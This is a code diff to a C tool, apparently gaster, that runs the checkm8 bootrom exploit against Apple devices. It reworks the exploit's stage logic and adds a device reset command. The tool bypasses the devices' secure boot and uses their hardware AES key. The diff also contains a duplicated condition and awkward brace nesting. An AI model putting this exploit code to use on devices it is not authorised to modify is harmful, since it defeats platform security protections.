@@ -19,14 +19,12 @@
 #	include <stdbool.h>
 #	include <string.h>
 #	include <stddef.h>
-
 #else
 #	include <CommonCrypto/CommonCrypto.h>
 #	include <CoreFoundation/CoreFoundation.h>
 #	include <IOKit/IOCFPlugIn.h>
 #	include <IOKit/usb/IOUSBLib.h>
 #endif
-
 
 #define DFU_DNLOAD (1)
 #define AES_CMD_DEC (1U)
@@ -190,8 +188,7 @@ static enum {
 	STAGE_SPRAY,
 	STAGE_SETUP,
 	STAGE_PATCH,
-	STAGE_PWNED,
-	STAGE_ABORT
+	STAGE_PWNED
 } stage;
 static uint16_t cpid;
 static bool manual_reset;
@@ -530,7 +527,7 @@ reset_usb_handle(usb_handle_t *handle) {
 	UInt64 session_id;
 
 	if(manual_reset) {
-		if(stage == STAGE_SETUP && (cpid == 0x8960 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011) && get_usb_session_id(handle, &session_id) && IOObjectRetain(handle->serv) == kIOReturnSuccess) {
+		if((stage == STAGE_SETUP || stage == STAGE_PATCH) && (cpid == 0x8960 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011) && get_usb_session_id(handle, &session_id) && IOObjectRetain(handle->serv) == kIOReturnSuccess) {
 			close_usb_handle(handle);
 			puts("Please disconnect and reconnect the lightning cable now.");
 			return wait_usb_handle(handle, 0, 0, manual_reset_check_usb_device, &session_id);
@@ -905,7 +902,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x18000082A;
 		}
 		if(cpid != 0) {
-			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL || strstr(usb_serial_num, " PWND:[checkm8]") != NULL;
+			*(bool *)pwned = strstr(usb_serial_num, pwnd_str) != NULL || strstr(usb_serial_num, " PWND:[checkm8]") != NULL || strstr(usb_serial_num, " PWND:[checkm8]") != NULL;
 			ret = true;
 		}
 		free(usb_serial_num);
@@ -1289,9 +1286,11 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 						overwrite_sz = sizeof(checkm8_overwrite);
 					}
 					if(overwrite != NULL && send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwrite_sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL && send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL)) {
-						ret = cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003 || dfu_send_data(handle, data, data_sz, false);
-						if(cpid != 0x8960) {
+						ret = true;
+						if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
 							send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
+						} else if(!dfu_send_data(handle, data, data_sz, false)) {
+							ret = false;
 						}
 					}
 					free(data);
@@ -1327,20 +1326,15 @@ gaster_checkm8(usb_handle_t *handle) {
 				puts("Stage: SETUP");
 				ret = checkm8_stage_setup(handle);
 				stage = STAGE_PATCH;
-			} else if(stage == STAGE_PATCH) {
+			} else {
 				puts("Stage: PATCH");
 				ret = checkm8_stage_patch(handle);
-				stage = STAGE_ABORT;
-			} else {
-				puts("Stage: ABORT");
-				send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
-				ret = true;
 			}
 			if(ret) {
 				puts("ret: true");
 			} else {
 				puts("ret: false");
-				if(stage != STAGE_ABORT) {
+				if(stage != STAGE_PATCH) {
 					stage = STAGE_RESET;
 				}
 			}
@@ -1681,6 +1675,20 @@ gaster_load_file(usb_handle_t *handle, const char *ibss_filename, const char *ib
 	return ret;
 }
 
+static bool
+gaster_reset(usb_handle_t *handle) {
+{
+	init_usb_handle(handle, APPLE_VID, DFU_MODE_PID);
+	if(wait_usb_handle(handle, 0, 0, NULL, NULL)) {
+		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
+		reset_usb_handle(handle);
+		close_usb_handle(handle);
+	return true;
+}
+	return false;
+     }
+}
+
 int
 main(int argc, char **argv) {
 	char *env_usb_timeout = getenv("USB_TIMEOUT");
@@ -1704,6 +1712,10 @@ main(int argc, char **argv) {
 		if(gaster_decrypt_file(&handle, argv[2], argv[3])) {
 			ret = 0;
 		}
+		} else if(argc == 2 && strcmp(argv[1], "reset") == 0) {
+		if(gaster_reset(&handle)) {
+			ret = 0;
+		}
 	} else {
 		printf("Usage: env %s options\n", argv[0]);
 		puts("env:");
@@ -1713,6 +1725,7 @@ main(int argc, char **argv) {
 		puts("pwn - Put the device in pwned DFU mode");
 		puts("load iBSS iBEC - Load the untrusted boot chain");
 		puts("decrypt src dst - Decrypt file using GID0 AES key");
+		puts("reset - reset device state");
 	}
 	return ret;
 }
